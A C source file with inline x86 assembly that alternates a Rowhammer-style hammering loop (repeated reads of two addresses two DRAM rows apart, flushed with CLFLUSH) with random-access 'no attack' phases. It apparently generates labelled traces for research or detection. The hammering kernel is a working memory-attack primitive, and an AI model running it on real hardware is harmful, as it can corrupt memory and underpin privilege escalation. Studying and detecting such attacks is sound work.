#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE (1<<18)
#define BUFFER_SIZE_MASK (BUFFER_SIZE - 1)

#define TIME_RATIO (30)
#define ATK_LOOPS_MIN (5000)
#define ATK_LOOPS_SPAN (5*ATK_LOOPS_MIN)
#define NO_ATK_LOOPS_MIN  (ATK_LOOPS_MIN * TIME_RATIO)
#define NO_ATK_LOOPS_SPAN (ATK_LOOPS_SPAN * TIME_RATIO)

//#if !defined(__i386__)
  //  #error "this program only works on intel x86 platforms"
//#endif

#define FLUSH(addr) asm volatile("CLFLUSH (%[a])"::[a] "r" (addr):);

void attack_loop(const uint32_t nb_loops, const uintptr_t addr1,
                 const uintptr_t addr2)
{
    asm volatile (
        "MOV %[nb_loops], %%ecx     \n"
        "JMP hammer_loop_asm		\n"
        "hammer_loop_asm: 		    \n" // do {
        "	MOV (%[addr1]), %%edx 	\n" //   edx = *addr1;
        "	MOV (%[addr2]), %%edx	\n" //   edx = *addr2;
        "   CLFLUSH (%[addr1])	    \n" //   cache_flush(addr1);
        "   CLFLUSH (%[addr2])      \n" //   cache_flush(addr2);
        "	LOOP hammer_loop_asm	\n" // } while ((--ecx) != 0);
        ::  [nb_loops] "r" (nb_loops),
            [addr1] "r" (addr1),
            [addr2] "r" (addr2)
        : "%ecx", "%edx", "memory"
	);
}

void no_attack_loop(const uint32_t nb_loops, const uintptr_t buffer,
                    const uintptr_t buffer_size_mask, const uint32_t rand_seed)
{
    uint32_t x = -1;
    uintptr_t addr = x;
    asm volatile (
        "MOV %[rand_seed], %%eax    \n"
        "MOV %[rand_mul], %%ebx     \n"
        "MOV %[nb_loops], %%ecx     \n"
        "JMP rand_loop_asm          \n"
        "rand_loop_asm:             \n"
        "   MUL %%ebx               \n" // random number generation step :
        "   ADD %[rand_add], %%eax  \n" // x = (25173 * x + 13849) & mask
        "   MOV %%eax, %%esi        \n" //
        "   AND %[mask], %%rsi      \n" //
        "   MOV (%[offset], %%rsi, 1), %%edx    \n"
        "   LOOP rand_loop_asm      \n"
        ::  [rand_seed] "r"(rand_seed),
            [nb_loops] "r" (nb_loops),
            [rand_mul] "i" (25173),
            [rand_add] "i" (13849),
            [mask] "r" (buffer_size_mask),
            [offset] "r" (buffer)
        : "%eax", "%ebx", "%ecx", "%edx", "rsi", "%esi"
    );
}

typedef union {
    uintptr_t addr;
    struct {
        uintptr_t buffer: 6;
        uintptr_t column: 7;
        uintptr_t bank_group: 2;
        uintptr_t bank: 2;
        uintptr_t row: 15;
    };
} addr_t;

void atk_no_atk_loops() {
    uint32_t buffer[BUFFER_SIZE]; // 3 rows
    addr_t addr1 = {.addr = (uintptr_t) &(buffer[0])};
    addr_t addr2 = {.addr = addr1.addr};
    addr2.row += 2;
    uintptr_t addr1_pt = addr1.addr;
    uintptr_t addr2_pt = addr2.addr;
    const uint32_t rand_seed = 1681;
    srand(rand_seed);
    int i;
    for (i = 0; i < 10; i++)
    {
        attack_loop(rand() % ATK_LOOPS_SPAN + ATK_LOOPS_MIN, addr1_pt, addr2_pt);

        no_attack_loop(rand()%NO_ATK_LOOPS_SPAN + NO_ATK_LOOPS_MIN,
                (uintptr_t) buffer, BUFFER_SIZE_MASK, rand());
    }
}

int main() {

    asm volatile ("start_program:");
    atk_no_atk_loops();
    asm volatile ("end_program:\nnop\nnop\nnop\nnop");

    return 0;
}
